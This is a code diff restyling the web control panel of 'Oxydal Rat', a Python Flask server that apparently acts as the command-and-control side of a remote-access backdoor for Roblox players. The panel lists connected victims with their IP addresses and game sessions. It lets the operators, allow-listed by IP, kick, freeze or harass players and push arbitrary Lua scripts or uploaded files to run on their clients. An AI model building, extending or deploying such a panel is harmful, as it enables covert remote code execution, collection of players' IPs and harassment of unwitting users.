@@ -14,12 +14,12 @@ socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet")
 
 ALLOWED_IPS = {"37.66.149.36", "91.170.86.224"}
 HISTORY_FILE = "history_log.json"
-
 connected_players = {}
 pending_kicks = {}
 pending_commands = {}
 history_log = []
 
+# === Chargement / sauvegarde historique ===
 def load_history():
     global history_log
     if os.path.exists(HISTORY_FILE):
@@ -36,6 +36,7 @@ def save_history():
     except:
         pass
 
+# === Sécurité IP ===
 def check_ip():
     ip = request.headers.get("X-Forwarded-For", request.remote_addr)
     if ip and "," in ip:
@@ -49,13 +50,10 @@ def access_denied(e):
     if detected and "," in detected:
         detected = detected.split(",")[0].strip()
     return f"""
-    <html>
-      <body style="background:#000;color:#ff3366;font-family:Arial;text-align:center;padding-top:15%;">
-        <h1>Accès refusé</h1>
-        <p>Ta crue quoi fdp ?</p>
-        <p>Ton IP : <b>{detected}</b></p>
-      </body>
-    </html>
+    <html><body style="background:#0f172a;color:#06b6d4;font-family:monospace;text-align:center;padding-top:15%;">
+      <h1>Accès refusé</h1>
+      <p>Ton IP : <b>{detected}</b></p>
+    </body></html>
     """, 403
 
 @app.before_request
@@ -76,330 +74,277 @@ def add_history(event_type, username, details=""):
     save_history()
     socketio.emit("history_update", {"history": history_log[:50]})
 
+# === NOUVEAU HTML MODERNE BLEU CIEL (style Wave) ===
 HTML = """<!DOCTYPE html>
-<html lang="en">
+<html lang="en" class="dark">
 <head>
 <meta charset="UTF-8">
-<title>Oxydal Rat</title>
+<title>Oxydal Rat — Wave Theme</title>
 <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
-<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600&family=Inter:wght@400;600&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono&display=swap" rel="stylesheet">
 <style>
-    *{box-sizing:border-box;margin:0;padding:0}
-    html, body{height:100vh;overflow:hidden}
-    body{font-family:Inter,sans-serif;background:radial-gradient(circle at top,#0f2027,#000);color:#fff;display:flex}
-    .sidebar{width:250px;background:rgba(10,10,10,0.95);border-right:2px solid #00ffaa;padding:20px;display:flex;flex-direction:column;gap:10px}
-    .sidebar-btn{padding:15px;background:rgba(30,30,30,0.8);border:2px solid #333;border-radius:12px;color:#fff;font-size:1.1rem;font-weight:600;cursor:pointer;transition:all .3s;text-align:left}
-    .sidebar-btn:hover{background:rgba(40,40,40,0.9);border-color:#00ffaa}
-    .sidebar-btn.active{background:linear-gradient(45deg,#00ffaa,#00aa88);border-color:#00ffaa;box-shadow:0 0 20px rgba(0,255,170,0.5)}
-    .main-content{flex:1;display:flex;flex-direction:column;overflow:hidden}
-    .header{padding:30px 40px;text-align:center;border-bottom:2px solid #00ffaa}
-    h1{font-family:Orbitron;font-size:3rem;color:#00ffaa;text-shadow:0 0 30px #00ffaa;margin-bottom:15px}
-    .stats{font-size:1.5rem;margin-top:10px}
-    .content-area{flex:1;overflow:hidden;position:relative;display:flex;flex-direction:column}
-    .tab-content{display:none;flex:1;overflow-y:auto;overflow-x:hidden;padding:30px 40px}
-    .tab-content.active{display:block}
-    .tab-content::-webkit-scrollbar{width:12px}
-    .tab-content::-webkit-scrollbar-track{background:rgba(0,0,0,0.3);border-radius:10px}
-    .tab-content::-webkit-scrollbar-thumb{background:linear-gradient(45deg,#00ffaa,#00aa88);border-radius:10px}
-    .tab-content::-webkit-scrollbar-thumb:hover{background:linear-gradient(45deg,#00ffcc,#00ccaa)}
-    .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:15px}
-    .card{background:rgba(20,20,20,.9);border-radius:18px;padding:20px;box-shadow:0 0 30px rgba(0,0,0,.7);transition:transform .3s}
-    .card:hover{transform:translateY(-8px)}
-    .status{display:flex;align-items:center;gap:10px;margin-bottom:12px}
-    .dot{width:12px;height:12px;border-radius:50%;background:red;box-shadow:0 0 12px red}
-    .dot.online{background:#00ffaa;box-shadow:0 0 18px #00ffaa}
-    .name{font-size:1.4rem;font-weight:600;color:#ffcc00;margin-bottom:8px;word-break:break-word}
-    .name a{color:#ffcc00;text-decoration:none}
-    .name a:hover{text-decoration:underline}
-    .info{font-size:0.85rem;color:#aaa;margin-bottom:15px;line-height:1.4}
-    .category{font-weight:bold;color:#00ffaa;margin:12px 0 8px;font-size:0.95rem}
-    button.kick-btn{padding:10px;border:none;border-radius:10px;cursor:pointer;font-weight:bold;font-size:0.8rem;color:white;transition:transform .2s;margin-bottom:6px}
-    button.kick-btn:hover{transform:scale(1.05)}
-    button.kick-btn:disabled{background:#444 !important;cursor:not-allowed;transform:none}
-    .history-item{background:rgba(20,20,20,0.9);padding:15px;border-radius:12px;margin-bottom:12px;border-left:4px solid #00ffaa;transition:all .3s}
-    .history-item:hover{background:rgba(30,30,30,0.9)}
-    .history-item.connect{border-color:#00ffaa}
-    .history-item.disconnect{border-color:#ff3366}
-    .history-item.action{border-color:#ffcc00}
-    .history-time{color:#00ffaa;font-weight:bold;font-size:0.9rem;margin-bottom:5px}
-    .history-user{color:#ffcc00;font-weight:600;font-size:1.1rem;margin-bottom:5px}
-    .history-details{color:#aaa;font-size:0.9rem}
-    .modal{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.8);align-items:center;justify-content:center;z-index:1000}
-    .modal.active{display:flex}
-    .modal-content{background:#111;padding:30px;border-radius:20px;width:90%;max-width:500px;box-shadow:0 0 40px rgba(255,51,102,0.5)}
-    .modal-content h2{text-align:center;color:#ff3366;margin-bottom:20px}
-    .modal-content input,.modal-content textarea{width:100%;padding:15px;border-radius:12px;border:none;background:#222;color:white;font-size:1.1rem;margin-bottom:20px}
-    .modal-buttons{display:flex;gap:15px}
-    .modal-buttons button{flex:1;padding:14px;border:none;border-radius:12px;font-weight:bold;cursor:pointer}
-    .confirm-btn{background:linear-gradient(45deg,#ff3366,#ff5588);color:white}
-    .cancel-btn{background:#444;color:white}
-    .toast-container{position:fixed;bottom:25px;right:25px;z-index:999}
-    .toast{background:#111;border-left:5px solid #00ffaa;padding:15px 20px;margin-top:12px;border-radius:10px;box-shadow:0 0 15px rgba(0,0,0,0.6)}
-    .toast.danger{border-color:#ff3366}
+    :root {
+        --bg: #0f172a;
+        --card: #1e293b;
+        --border: #334155;
+        --primary: #06b6d4;
+        --primary-hover: #0891b2;
+        --text: #e2e8f0;
+        --text-muted: #94a3b8;
+        --danger: #ef4444;
+        --success: #10b981;
+    }
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text); min-height: 100vh; display: flex; }
+    .header { position: fixed; top: 0; left: 0; right: 0; height: 70px; background: rgba(15,23,42,0.95); backdrop-filter: blur(12px); border-bottom: 1px solid var(--border); z-index: 1000; display: flex; align-items: center; padding: 0 2rem; justify-content: space-between; }
+    .logo { display: flex; align-items: center; gap: 12px; font-weight: 700; font-size: 1.5rem; }
+    .logo svg { width: 40px; height: 40px; fill: var(--primary); }
+    .stats { font-size: 1.1rem; color: var(--text-muted); }
+    .stats b { color: var(--primary); font-weight: 600; }
+    .main { flex: 1; margin-top: 70px; display: flex; }
+    .sidebar { width: 260px; background: rgba(30,41,59,0.95); border-right: 1px solid var(--border); padding: 1.5rem 0; }
+    .nav-item { padding: 1rem 2rem; cursor: pointer; transition: all 0.3s; color: var(--text-muted); font-weight: 500; }
+    .nav-item:hover { background: rgba(6,182,212,0.1); color: var(--primary); }
+    .nav-item.active { background: rgba(6,182,212,0.2); color: var(--primary); border-left: 4px solid var(--primary); }
+    .content { flex: 1; padding: 2rem; overflow-y: auto; }
+    .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 1.5rem; }
+    .card { background: var(--card); border: 1px solid var(--border); border-radius: 16px; padding: 1.5rem; transition: all 0.4s; position: relative; overflow: hidden; }
+    .card:hover { transform: translateY(-8px); box-shadow: 0 20px 40px rgba(6,182,212,0.15); border-color: var(--primary); }
+    .card::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 3px; background: linear-gradient(90deg, transparent, var(--primary), transparent); opacity: 0; transition: opacity 0.4s; }
+    .card:hover::before { opacity: 1; }
+    .status { display: flex; align-items: center; gap: 8px; margin-bottom: 12px; }
+    .dot { width: 10px; height: 10px; border-radius: 50%; background: #ef4444; box-shadow: 0 0 10px #ef444430; }
+    .dot.online { background: var(--primary); box-shadow: 0 0 20px var(--primary); animation: pulse 2s infinite; }
+    @keyframes pulse { 0%,100% { opacity:1; } 50% { opacity:0.7; } }
+    .name { font-size: 1.3rem; font-weight: 600; margin-bottom: 8px; }
+    .name a { color: var(--primary); text-decoration: none; }
+    .name a:hover { text-decoration: underline; }
+    .info { font-size: 0.9rem; color: var(--text-muted); line-height: 1.5; margin-bottom: 16px; }
+    .btn-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin: 12px 0; }
+    .btn { padding: 10px; border: none; border-radius: 10px; font-weight: 600; font-size: 0.8rem; cursor: pointer; transition: all 0.3s; color: white; }
+    .btn:hover { transform: translateY(-2px); }
+    .btn.kick { background: linear-gradient(45deg, #ef4444, #dc2626); }
+    .btn.freeze { background: linear-gradient(45deg, #8b5cf6, #7c3aed); }
+    .btn.spin { background: linear-gradient(45deg, #06b6d4, #0891b2); }
+    .btn.lua { background: linear-gradient(45deg, #10b981, #059669); }
+    .btn.sound { background: linear-gradient(45deg, #f59e0b, #d97706); }
+    .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.8); z-index: 2000; align-items: center; justify-content: center; }
+    .modal.active { display: flex; }
+    .modal-content { background: var(--card); border: 1px solid var(--border); border-radius: 16px; width: 90%; max-width: 500px; padding: 2rem; box-shadow: 0 20px 60px rgba(6,182,212,0.3); }
+    .modal-content h2 { color: var(--primary); margin-bottom: 1rem; text-align: center; font-size: 1.5rem; }
+    input, textarea { width: 100%; padding: 14px; background: #0f172a; border: 1px solid var(--border); border-radius: 12px; color: white; margin-bottom: 1rem; font-family: 'JetBrains Mono', monospace; }
+    .modal-buttons { display: flex; gap: 1rem; }
+    .modal-btn { flex: 1; padding: 14px; border: none; border-radius: 12px; font-weight: 600; cursor: pointer; transition: all 0.3s; }
+    .confirm { background: var(--primary); color: white; }
+    .confirm:hover { background: var(--primary-hover); transform: translateY(-2px); }
+    .cancel { background: #475569; color: white; }
+    .toast-container { position: fixed; bottom: 20px; right: 20px; z-index: 9999; }
+    .toast { background: var(--card); border-left: 5px solid var(--primary); padding: 1rem 1.5rem; margin-top: 1rem; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); animation: slideIn 0.4s; }
+    @keyframes slideIn { from { transform: translateX(100%); } to { transform: translateX(0); } }
+    .history-item { background: var(--card); padding: 1rem; border-radius: 12px; margin-bottom: 1rem; border-left: 4px solid var(--primary); }
 </style>
 </head>
 <body>
-<div class="sidebar">
-    <div class="sidebar-btn active" onclick="switchTab('players')">Players</div>
-    <div class="sidebar-btn" onclick="switchTab('history')">History</div>
-</div>
-<div class="main-content">
-    <div class="header">
-        <h1>Oxydal Rat</h1>
-        <div class="stats" id="stats">Players online: <b>0</b></div>
+
+<div class="header">
+    <div class="logo">
+        <svg viewBox="0 0 738 738"><rect fill="#0f172a" width="738" height="738"></rect><path fill="#06b6d4" d="M550.16,367.53q0,7.92-.67,15.66c-5.55-17.39-19.61-44.32-53.48-44.32-50,0-54.19,44.6-54.19,44.6a22,22,0,0,1,18.19-9c12.51,0,19.71,4.92,19.71,18.19S468,415.79,448.27,415.79s-40.93-11.37-40.93-42.44c0-58.71,55.27-68.56,55.27-68.56-44.84-4.05-61.56,4.76-75.08,23.3-25.15,34.5-9.37,77.47-9.37,77.47s-33.87-18.95-33.87-74.24c0-89.28,91.33-100.93,125.58-87.19-23.74-23.75-43.4-29.53-69.11-29.53-62.53,0-108.23,60.13-108.23,111,0,44.31,34.85,117.16,132.31,117.16,86.66,0,95.46-55.09,86-69,36.54,36.57-17.83,84.12-86,84.12-28.87,0-105.17-6.55-150.89-79.59C208,272.93,334.58,202.45,334.58,202.45c-32.92-2.22-54.82,7.85-56.62,8.71a181,181,0,0,1,272.2,156.37Z"></path></svg>
+        <div>Oxydal Rat</div>
     </div>
-    <div class="content-area">
-        <div class="tab-content active" id="players-tab">
+    <div class="stats">Players online: <b id="stats">0</b></div>
+</div>
+
+<div class="main">
+    <div class="sidebar">
+        <div class="nav-item active" onclick="switchTab('players')">Players</div>
+        <div class="nav-item" onclick="switchTab('history')">History</div>
+    </div>
+
+    <div class="content">
+        <div id="players-tab" class="tab active">
             <div class="grid" id="players"></div>
         </div>
-        <div class="tab-content" id="history-tab">
+        <div id="history-tab" class="tab" style="display:none;">
             <div id="history"></div>
         </div>
     </div>
 </div>
 
 <!-- Modals -->
-<div class="modal" id="kickModal">
-    <div class="modal-content">
-        <h2>Kick Player</h2>
-        <input type="text" id="kickReason" placeholder="Reason (optional)" autofocus>
-        <div class="modal-buttons">
-            <button class="cancel-btn" id="cancelKick">Cancel</button>
-            <button class="confirm-btn" id="confirmKick">Confirm</button>
-        </div>
+<div class="modal" id="kickModal"><div class="modal-content">
+    <h2>Kick Player</h2>
+    <input type="text" id="kickReason" placeholder="Reason (optional)" autofocus>
+    <div class="modal-buttons">
+        <button class="modal-btn cancel" id="cancelKick">Cancel</button>
+        <button class="modal-btn confirm" id="confirmKick">Kick</button>
     </div>
-</div>
+</div></div>
 
-<div class="modal" id="playSoundModal">
-    <div class="modal-content" style="border-left:5px solid orange; box-shadow:0 0 40px rgba(255,165,0,0.7);">
-        <h2 style="color:orange;">Play Sound</h2>
-        <input type="text" id="soundAssetId" placeholder="Enter Asset ID" autofocus>
-        <div class="modal-buttons">
-            <button class="cancel-btn" id="cancelSound">Cancel</button>
-            <button class="confirm-btn" id="confirmSound" style="background:linear-gradient(45deg,orange,#ff9900);">Confirm</button>
-        </div>
+<div class="modal" id="playSoundModal"><div class="modal-content">
+    <h2>Play Sound</h2>
+    <input type="text" id="soundAssetId" placeholder="Asset ID">
+    <div class="modal-buttons">
+        <button class="modal-btn cancel" id="cancelSound">Cancel</button>
+        <button class="modal-btn confirm" id="confirmSound">Play</button>
     </div>
-</div>
+</div></div>
 
-<div class="modal" id="textScreenModal">
-    <div class="modal-content" style="border-left:5px solid #00ffff; box-shadow:0 0 40px rgba(0,255,255,0.7);">
-        <h2 style="color:#00ffff;">Display Text Screen</h2>
-        <input type="text" id="screenText" placeholder="Enter text to display" autofocus>
-        <div class="modal-buttons">
-            <button class="cancel-btn" id="cancelText">Cancel</button>
-            <button class="confirm-btn" id="confirmText" style="background:linear-gradient(45deg,#00ffff,#00aaaa);">Display</button>
-        </div>
+<div class="modal" id="textScreenModal"><div class="modal-content">
+    <h2>Text Screen</h2>
+    <input type="text" id="screenText" placeholder="Text to display">
+    <div class="modal-buttons">
+        <button class="modal-btn cancel" id="cancelText">Cancel</button>
+        <button class="modal-btn confirm" id="confirmText">Show</button>
     </div>
-</div>
+</div></div>
 
-<div class="modal" id="luaExecModal">
-    <div class="modal-content" style="border-left:5px solid #ff00ff; box-shadow:0 0 40px rgba(255,0,255,0.7);">
-        <h2 style="color:#ff00ff;">Execute Lua Script</h2>
-        <textarea id="luaScript" placeholder="Enter Lua code to execute" style="min-height:150px;font-family:monospace;resize:vertical;"></textarea>
-        <div class="modal-buttons">
-            <button class="cancel-btn" id="cancelLua">Cancel</button>
-            <button class="confirm-btn" id="confirmLua" style="background:linear-gradient(45deg,#ff00ff,#aa00aa);">Execute</button>
-        </div>
+<div class="modal" id="luaExecModal"><div class="modal-content">
+    <h2>Execute Lua</h2>
+    <textarea id="luaScript" placeholder="Lua code..." style="height:180px;"></textarea>
+    <div class="modal-buttons">
+        <button class="modal-btn cancel" id="cancelLua">Cancel</button>
+        <button class="modal-btn confirm" id="confirmLua">Execute</button>
     </div>
-</div>
+</div></div>
 
-<div class="modal" id="importFileModal">
-    <div class="modal-content" style="border-left:5px solid #00ff00; box-shadow:0 0 40px rgba(0,255,0,0.7);">
-        <h2 style="color:#00ff00;">Import Lua File</h2>
-        <input type="file" id="luaFileInput" accept=".lua,.txt" style="width:100%;padding:15px;border-radius:12px;border:2px dashed #00ff00;background:#222;color:white;font-size:1rem;margin-bottom:20px;cursor:pointer;">
-        <div class="modal-buttons">
-            <button class="cancel-btn" id="cancelImport">Cancel</button>
-            <button class="confirm-btn" id="confirmImport" style="background:linear-gradient(45deg,#00ff00,#00aa00);">Execute File</button>
-        </div>
+<div class="modal" id="importFileModal"><div class="modal-content">
+    <h2>Import Lua File</h2>
+    <input type="file" id="luaFileInput" accept=".lua,.txt" style="padding:1rem;background:#0f172a;border:2px dashed var(--primary);border-radius:12px;cursor:pointer;">
+    <div class="modal-buttons">
+        <button class="modal-btn cancel" id="cancelImport">Cancel</button>
+        <button class="modal-btn confirm" id="confirmImport">Execute File</button>
     </div>
-</div>
+</div></div>
 
 <div class="toast-container" id="toasts"></div>
 
 <script>
 const socket = io();
-let currentKickId = null, currentSoundId = null, currentTextId = null, currentLuaId = null, currentImportId = null;
-
-const kickModal = document.getElementById("kickModal");
-const playSoundModal = document.getElementById("playSoundModal");
-const textScreenModal = document.getElementById("textScreenModal");
-const luaExecModal = document.getElementById("luaExecModal");
-const importFileModal = document.getElementById("importFileModal");
+let currentId = null;
 
 function switchTab(tab) {
-    document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
-    document.querySelectorAll('.sidebar-btn').forEach(b => b.classList.remove('active'));
-    document.getElementById(tab + '-tab').classList.add('active');
+    document.querySelectorAll('.tab').forEach(t => t.style.display = 'none');
+    document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+    document.getElementById(tab + '-tab').style.display = 'block';
     event.target.classList.add('active');
 }
 
-function toast(msg, type = "success") {
+function toast(msg, type = "info") {
     const t = document.createElement("div");
-    t.className = "toast " + (type === "danger" ? "danger" : "");
+    t.className = "toast";
+    t.style.borderLeftColor = type === "danger" ? "#ef4444" : "#06b6d4";
     t.textContent = msg;
     document.getElementById("toasts").appendChild(t);
     setTimeout(() => t.remove(), 5000);
 }
 
-// Kick
-function openKickModal(id) { currentKickId = id; kickModal.classList.add("active"); document.getElementById("kickReason").focus(); }
-function closeModal() { kickModal.classList.remove("active"); currentKickId = null; }
-function performKick() {
-    if (!currentKickId) return;
-    const reason = document.getElementById("kickReason").value.trim() || "Kicked by admin";
-    fetch("/kick", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({userid: currentKickId, reason: reason})});
-    toast(`Kick sent`, "danger");
-    closeModal();
-}
-
-// Play Sound
-function openPlaySoundModal(id) { currentSoundId = id; playSoundModal.classList.add("active"); document.getElementById("soundAssetId").focus(); }
-function closeSoundModal() { playSoundModal.classList.remove("active"); currentSoundId = null; }
-function performPlaySound() {
-    if (!currentSoundId) return;
-    const assetId = document.getElementById("soundAssetId").value.trim();
-    if(!assetId) return toast("Enter a valid Asset ID", "danger");
-    sendTroll(currentSoundId, "playsound", assetId);
-    closeSoundModal();
-}
-
-// Text Screen
-function openTextScreenModal(id) { currentTextId = id; textScreenModal.classList.add("active"); document.getElementById("screenText").focus(); }
-function closeTextModal() { textScreenModal.classList.remove("active"); currentTextId = null; }
-function performTextScreen() {
-    if (!currentTextId) return;
-    const text = document.getElementById("screenText").value.trim();
-    if(!text) return toast("Enter text to display", "danger");
-    sendTroll(currentTextId, "textscreen", text);
-    closeTextModal();
-}
-
-// Lua Exec
-function openLuaExecModal(id) { currentLuaId = id; luaExecModal.classList.add("active"); document.getElementById("luaScript").focus(); }
-function closeLuaModal() { luaExecModal.classList.remove("active"); currentLuaId = null; }
-function performLuaExec() {
-    if (!currentLuaId) return;
-    const script = document.getElementById("luaScript").value.trim();
-    if(!script) return toast("Enter Lua code", "danger");
-    sendTroll(currentLuaId, "luaexec", script);
-    closeLuaModal();
-}
-
-// Import File
-function openImportFileModal(id) { currentImportId = id; importFileModal.classList.add("active"); }
-function closeImportModal() { importFileModal.classList.remove("active"); currentImportId = null; }
-function performImportFile() {
-    if (!currentImportId) return;
-    const file = document.getElementById("luaFileInput").files[0];
-    if(!file) return toast("Select a file", "danger");
-    const reader = new FileReader();
-    reader.onload = e => {
-        sendTroll(currentImportId, "luaexec", e.target.result);
-        closeImportModal();
-        document.getElementById("luaFileInput").value = "";
-    };
-    reader.readAsText(file);
-}
+function openModal(modalId, id) { currentId = id; document.getElementById(modalId).classList.add('active'); }
+function closeModal(modalId) { document.getElementById(modalId).classList.remove('active'); currentId = null; }
 
 function sendTroll(id, cmd, param = null) {
-    const body = {userid: id, cmd: cmd};
+    const data = { userid: id, cmd };
     if (param !== null) {
-        if (cmd === "playsound") body.assetId = param;
-        else if (cmd === "textscreen") body.text = param;
-        else if (cmd === "luaexec") body.script = param;
+        if (cmd === "playsound") data.assetId = param;
+        if (cmd === "textscreen") data.text = param;
+        if (cmd === "luaexec") data.script = param;
     }
-    fetch("/troll", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify(body)});
-    toast(`${cmd.toUpperCase()} sent`, "danger");
+    fetch("/troll", { method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify(data) });
+    toast(cmd.toUpperCase() + " sent");
 }
 
-// Events
-document.getElementById("cancelKick").onclick = closeModal;
-document.getElementById("confirmKick").onclick = performKick;
-document.getElementById("cancelSound").onclick = closeSoundModal;
-document.getElementById("confirmSound").onclick = performPlaySound;
-document.getElementById("cancelText").onclick = closeTextModal;
-document.getElementById("confirmText").onclick = performTextScreen;
-document.getElementById("cancelLua").onclick = closeLuaModal;
-document.getElementById("confirmLua").onclick = performLuaExec;
-document.getElementById("cancelImport").onclick = closeImportModal;
-document.getElementById("confirmImport").onclick = performImportFile;
+document.getElementById("confirmKick").onclick = () => {
+    const reason = document.getElementById("kickReason").value || "Kicked by admin";
+    fetch("/kick", { method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({userid: currentId, reason}) });
+    toast("Player kicked", "danger");
+    closeModal("kickModal");
+};
 
-[kickModal, playSoundModal, textScreenModal, luaExecModal, importFileModal].forEach(m => {
-    m.onclick = e => { if (e.target === m) m.classList.remove("active"); }
+document.getElementById("confirmSound").onclick = () => {
+    const asset = document.getElementById("soundAssetId").value.trim();
+    if (asset) sendTroll(currentId, "playsound", asset);
+    closeModal("playSoundModal");
+};
+
+document.getElementById("confirmText").onclick = () => {
+    const text = document.getElementById("screenText").value.trim();
+    if (text) sendTroll(currentId, "textscreen", text);
+    closeModal("textScreenModal");
+};
+
+document.getElementById("confirmLua").onclick = () => {
+    const script = document.getElementById("luaScript").value.trim();
+    if (script) sendTroll(currentId, "luaexec", script);
+    closeModal("luaExecModal");
+};
+
+document.getElementById("confirmImport").onclick = () => {
+    const file = document.getElementById("luaFileInput").files[0];
+    if (!file) return toast("No file selected", "danger");
+    const reader = new FileReader();
+    reader.onload = e => { sendTroll(currentId, "luaexec", e.target.result); closeModal("importFileModal"); };
+    reader.readAsText(file);
+};
+
+document.querySelectorAll('.cancel').forEach(btn => {
+    btn.onclick = () => closeModal(btn.closest('.modal').id);
 });
 
 function render(data) {
-    document.getElementById("stats").innerHTML = `Players online: <b>${data.online}</b> / ${data.total}`;
+    document.getElementById("stats").innerText = data.online;
     const grid = document.getElementById("players");
-    const currentIds = new Set(Object.keys(data.players));
-
+    const current = new Set(Object.keys(data.players));
     Object.entries(data.players).forEach(([id, p]) => {
         let card = document.getElementById(`card_${id}`);
-        if (!card) { card = document.createElement("div"); card.className = "card"; card.id = `card_${id}`; grid.appendChild(card); }
+        if (!card) {
+            card = document.createElement("div");
+            card.className = "card";
+            card.id = `card_${id}`;
+            grid.appendChild(card);
+        }
         card.innerHTML = `
-            <div class="status"><div class="dot ${p.online ? "online" : ""}"></div><span>${p.online ? "Online" : "Offline"}</span></div>
-            <div class="name"><a href="https://www.roblox.com/users/${id}/profile" target="_blank">${p.username}</a> (ID ${id})</div>
-            <div class="info">Executor: ${p.executor}<br>IP: ${p.ip}<br>Game: <a href="https://www.roblox.com/games/${p.gameId}" target="_blank">${p.game}</a><br>JobId: ${p.jobId}</div>
-            <div class="category">TROLLS</div>
-            <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:6px;">
-                <button class="kick-btn" style="background:linear-gradient(45deg,#ff3366,#ff5588);" onclick="openKickModal('${id}')">KICK</button>
-                <button class="kick-btn" style="background:linear-gradient(45deg,#ff00ff,#aa00aa);" onclick="sendTroll('${id}','freeze')">FREEZE</button>
-                <button class="kick-btn" style="background:linear-gradient(45deg,#00ffff,#00aaaa);" onclick="sendTroll('${id}','spin')">SPIN</button>
-                <button class="kick-btn" style="background:linear-gradient(45deg,#ffff00,#aaaa00);" onclick="sendTroll('${id}','jump')">JUMP</button>
-                <button class="kick-btn" style="background:linear-gradient(45deg,#88ff88,#55aa55);" onclick="sendTroll('${id}','rainbow')">RAINBOW</button>
-                <button class="kick-btn" style="background:linear-gradient(45deg,#ff5555,#aa0000);" onclick="sendTroll('${id}','explode')">EXPLODE</button>
-                <button class="kick-btn" style="background:linear-gradient(45deg,#5555ff,#0000aa);" onclick="sendTroll('${id}','invisible')">INVISIBLE</button>
-                <button class="kick-btn" style="background:orange;" onclick="openPlaySoundModal('${id}')">PLAY SOUND</button>
-                <button class="kick-btn" style="background:linear-gradient(45deg,#00ffff,#00aaaa);" onclick="openTextScreenModal('${id}')">TEXT SCREEN</button>
-            </div>
-            <div class="category">UNDO</div>
-            <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:6px;">
-                <button class="kick-btn" style="background:#666;" onclick="sendTroll('${id}','unfreeze')">UNFREEZE</button>
-                <button class="kick-btn" style="background:#666;" onclick="sendTroll('${id}','unspin')">UNSPIN</button>
-                <button class="kick-btn" style="background:#666;" onclick="sendTroll('${id}','unrainbow')">STOP RAINBOW</button>
-                <button class="kick-btn" style="background:#666;" onclick="sendTroll('${id}','uninvisible')">VISIBLE</button>
-                <button class="kick-btn" style="background:#666;" onclick="sendTroll('${id}','stopsound')">STOP SOUND</button>
-                <button class="kick-btn" style="background:#666;" onclick="sendTroll('${id}','hidetext')">HIDE TEXT</button>
-            </div>
-            <div class="category">LUA EXEC</div>
-            <div style="display:grid;grid-template-columns:1fr 1fr;gap:6px;">
-                <button class="kick-btn" style="background:linear-gradient(45deg,#00ff00,#00aa00);" onclick="openImportFileModal('${id}')">IMPORT FILE</button>
-                <button class="kick-btn" style="background:linear-gradient(45deg,#ff00ff,#aa00aa);" onclick="openLuaExecModal('${id}')">EXECUTOR</button>
+            <div class="status"><div class="dot ${p.online ? 'online' : ''}"></div><span>${p.online ? 'Online' : 'Offline'}</span></div>
+            <div class="name"><a href="https://www.roblox.com/users/${id}/profile" target="_blank">${p.username}</a> (${id})</div>
+            <div class="info">Executor: ${p.executor}<br>IP: ${p.ip}<br>Game: <a href="https://www.roblox.com/games/${p.gameId}" target="_blank">${p.game}</a></div>
+            <div class="btn-grid">
+                <button class="btn kick" onclick="openModal('kickModal','${id}')">KICK</button>
+                <button class="btn freeze" onclick="sendTroll('${id}','freeze')">FREEZE</button>
+                <button class="btn spin" onclick="sendTroll('${id}','spin')">SPIN</button>
+                <button class="btn" style="background:#f59e0b" onclick="openModal('playSoundModal','${id}')">SOUND</button>
+                <button class="btn" style="background:#06b6d4" onclick="openModal('textScreenModal','${id}')">TEXT</button>
+                <button class="btn lua" onclick="openModal('luaExecModal','${id}')">LUA</button>
+                <button class="btn lua" style="grid-column:span 3;background:#10b981" onclick="openModal('importFileModal','${id}')">IMPORT FILE</button>
             </div>
         `;
     });
-
     document.querySelectorAll('.card').forEach(c => {
-        if (!currentIds.has(c.id.replace('card_', ''))) c.remove();
+        if (!current.has(c.id.replace('card_',''))) c.remove();
     });
 }
 
 function renderHistory(data) {
-    const historyDiv = document.getElementById("history");
-    historyDiv.innerHTML = "";
-    data.history.forEach(item => {
-        const div = document.createElement("div");
-        div.className = `history-item ${item.type}`;
-        div.innerHTML = `<div class="history-time">${item.time}</div><div class="history-user">${item.username}</div><div class="history-details">${item.details}</div>`;
-        historyDiv.appendChild(div);
-    });
+    const div = document.getElementById("history");
+    div.innerHTML = data.history.map(h => `
+        <div class="history-item">
+            <strong>[${h.time}] ${h.username}</strong><br>
+            <span style="color:#94a3b8">${h.details}</span>
+        </div>
+    `).join('');
 }
 
 socket.on("update", render);
 socket.on("history_update", renderHistory);
-socket.on("kick_notice", d => toast(`${d.username} → ${d.reason}`, "danger"));
-socket.on("status", d => toast(`${d.username} is now ${d.online ? "online" : "offline"}`));
-
-fetch("/get_history").then(r => r.json()).then(data => renderHistory(data));
+socket.on("kick_notice", d => toast(d.username + " → " + d.reason, "danger"));
+fetch("/get_history").then(r => r.json()).then(renderHistory);
 </script>
 </body>
 </html>"""
 
+# === Routes (inchangées) ===
 @app.route("/")
 def index():
     return render_template_string(HTML)
 
-@app.route("/get_history", methods=["GET"])
+@app.route("/get_history")
 def get_history():
     return jsonify({"history": history_log[:50]})
 
@@ -413,13 +358,9 @@ def api():
             if d.get("action") == "register":
                 username = d.get("username", "Unknown")
                 connected_players[uid] = {
-                    "username": username,
-                    "executor": d.get("executor", "Unknown"),
-                    "ip": d.get("ip", "Unknown"),
-                    "last": now,
-                    "online": True,
-                    "game": d.get("game", "Unknown"),
-                    "gameId": d.get("gameId", 0),
+                    "username": username, "executor": d.get("executor", "Unknown"),
+                    "ip": d.get("ip", "Unknown"), "last": now, "online": True,
+                    "game": d.get("game", "Unknown"), "gameId": d.get("gameId", 0),
                     "jobId": d.get("jobId", "Unknown")
                 }
